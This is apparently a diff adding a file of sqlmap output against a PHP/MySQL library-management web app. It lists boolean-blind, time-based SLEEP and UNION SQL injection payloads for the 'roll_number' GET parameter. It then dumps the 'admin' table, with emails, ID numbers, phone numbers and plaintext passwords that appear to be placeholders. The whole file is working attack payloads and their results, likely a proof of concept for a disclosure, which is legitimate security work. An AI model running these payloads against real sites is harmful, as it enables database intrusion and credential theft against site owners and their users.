@@ -1,0 +1,28 @@
+sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
+---
+Parameter: roll_number (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: roll_number=CSE001' AND 8121=8121-- UlZK
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: roll_number=CSE001' AND (SELECT 9484 FROM (SELECT(!SLEEP(5)))kWDW)-- HRxK
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: roll_number=-3378' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x427943426c5358757743644a48546c795174514268497a567855497945595146556c43424f4b4c56,0x71626a6271),NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Windows
+web application technology: Apache 2.4.58, PHP 8.0.30
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: project_library
+Table: admin
+[2 entries]
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| admin_id | email_id              | adhaar_id    | contact    | lastname | password     | username       | firstname | admin_type | middlename | admin_added         | admin_image           | confirm_password |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| 1        | johndoe@example.com   | 123456789012 | 9876543210 | Doe      | admin123     | admin          | John      | Admin      | A.         | 2023-10-26 10:00:00 | avatar-366-456318.jpg | admin123         |
+| 2        | janesmith@example.com | 210987654321 | 9876543211 | Smith    | librarian123 | jane.librarian | Jane      | Librarian  | B.         | 2023-10-26 10:05:00 | user.png              | librarian123     |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+
